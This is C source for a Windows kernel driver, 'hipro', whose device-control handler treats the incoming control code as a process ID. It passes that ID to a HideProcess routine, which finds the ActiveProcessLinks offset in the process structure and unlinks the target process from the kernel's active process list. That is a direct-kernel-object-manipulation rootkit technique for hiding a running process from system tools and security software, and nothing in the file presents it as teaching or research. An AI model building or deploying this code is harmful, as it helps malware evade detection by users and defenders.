#include "common.h"
#include <ntdef.h>
#include <ntifs.h>
#include <windef.h> // for DWORD

DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD DriverUnload;

PDEVICE_OBJECT g_DeviceObject = NULL;
UNICODE_STRING DriverName, SymbolName;
PVOID ObHandle = NULL;

int ActiveProcessLinks_off = 0;

#pragma alloc_text(INIT, DriverEntry)

#define DEVICE_NAME L"\\Device\\hipro"
#define SYMBOLIC_LINK_NAME L"\\DosDevices\\hiproSL"
PVOID hRegistration = NULL;

BOOLEAN GetOffset(IN PEPROCESS Process)
{
    BOOLEAN success = FALSE;
    HANDLE PID = PsGetCurrentProcessId();
    PLIST_ENTRY ListEntry = { 0, };
    PLIST_ENTRY NextEntry = { 0, };

    for (int i = 0x00; i < PAGE_SIZE; i += 8)
    {
        if (*(PHANDLE)((PCHAR)Process + i) == PID)
        {
            ListEntry = (PVOID*)((PCHAR)Process + i + 0x8);
            if (MmIsAddressValid(ListEntry) && MmIsAddressValid(ListEntry->Flink))
            {
                NextEntry = ListEntry->Flink;
                if (ListEntry == NextEntry->Blink)
                {
                    ActiveProcessLinks_off = i + 8;
                    success = TRUE;
                    break;
                }
            }
        }
    }
    return success;
}

VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symLinkName;
    RtlInitUnicodeString(&symLinkName, SYMBOLIC_LINK_NAME);

    // Delete symbolic link
    IoDeleteSymbolicLink(&symLinkName);

    // Delete device object
    if (g_DeviceObject != NULL) {
        IoDeleteDevice(g_DeviceObject);
        g_DeviceObject = NULL;
    }

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Driver unloaded\n");
}


NTSTATUS HideProcess(ULONG targetProcessId)
{
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PID received.\n");

    HANDLE targetPid = (HANDLE)targetProcessId;
    NTSTATUS status = STATUS_SUCCESS;
    PEPROCESS Process = NULL;

    status = PsLookupProcessByProcessId(targetPid, &Process);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Failed to lookup process by ID: %x\n", status);
        return status;
    }
	if (!GetOffset(PsGetCurrentProcess()))
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Failed to get offset\n");
		return STATUS_UNSUCCESSFUL;
	}
    PLIST_ENTRY pListEntry = { 0, };
    char szProcName[16] = { 0, };

    pListEntry = ((DWORD64)Process + ActiveProcessLinks_off);
    if (pListEntry->Flink != NULL && pListEntry->Blink != NULL)
    {
        pListEntry->Flink->Blink = pListEntry->Blink;
        pListEntry->Blink->Flink = pListEntry->Flink;

        pListEntry->Flink = 0;
        pListEntry->Blink = 0;
    }
	return status;
}

NTSTATUS Create(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Open ok\n");
    return STATUS_SUCCESS;
}
NTSTATUS Close(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Close ok\n");
    return STATUS_SUCCESS;
}

NTSTATUS DriverDispatchRoutine(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
    PVOID buffer;
    NTSTATUS NtStatus = STATUS_SUCCESS;
    PIO_STACK_LOCATION pIo;
    pIo = IoGetCurrentIrpStackLocation(pIrp);
    pIrp->IoStatus.Information = 0;
    switch (pIo->MajorFunction)
    {
    case IRP_MJ_CREATE:
        NtStatus = STATUS_SUCCESS;
        break;
    case IRP_MJ_READ:
        NtStatus = STATUS_SUCCESS;
        break;
    case IRP_MJ_WRITE:
        break;
    case IRP_MJ_CLOSE:
        NtStatus = STATUS_SUCCESS;
        break;
    default:
        NtStatus = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return NtStatus;
}

NTSTATUS IoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    NTSTATUS status;
    ULONG BytesIO = 0;

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);

    // Code received from user space
    ULONG userSignal = stack->Parameters.DeviceIoControl.IoControlCode;
    // Write to process memory
    status = HideProcess(userSignal);
    if (status != STATUS_SUCCESS)
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Failed to hide process: %x\n", status);
    }

    // Complete the request
    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}


NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pUniStr)
{
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Driver loaded\n");

    NTSTATUS NtRet = STATUS_SUCCESS;
    PDEVICE_OBJECT pDeviceObj;

    RtlInitUnicodeString(&DriverName, DEVICE_NAME); // Giving the driver a name
    RtlInitUnicodeString(&SymbolName, SYMBOLIC_LINK_NAME); // Giving the driver a symbol

    NTSTATUS NtRet2 = IoCreateDevice(pDriverObject, 0, &DriverName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, TRUE, &pDeviceObj);

    if (NtRet2 == STATUS_SUCCESS)
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IoCreateDevice ok\n");
        ULONG i;

        for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
        {
            pDriverObject->MajorFunction[i] = DriverDispatchRoutine;
        }

        NTSTATUS NtRet2 = IoCreateSymbolicLink(&SymbolName, &DriverName);
        if (NtRet2 != STATUS_SUCCESS)
        {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IoCreateSymbolicLink failed\n");
            return STATUS_UNSUCCESSFUL;
        }

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IoCreateSymbolicLink ok\n");

        pDriverObject->MajorFunction[IRP_MJ_CREATE] = Create;
        pDriverObject->MajorFunction[IRP_MJ_CLOSE] = Close;
        pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl;

        pDeviceObj->Flags |= DO_DIRECT_IO;
        pDeviceObj->Flags &= (~DO_DEVICE_INITIALIZING);
    }
    else
    {
        return STATUS_UNSUCCESSFUL;
    }

    pDriverObject->DriverUnload = DriverUnload; // Telling the driver, this is the unload function

    return STATUS_SUCCESS;
}
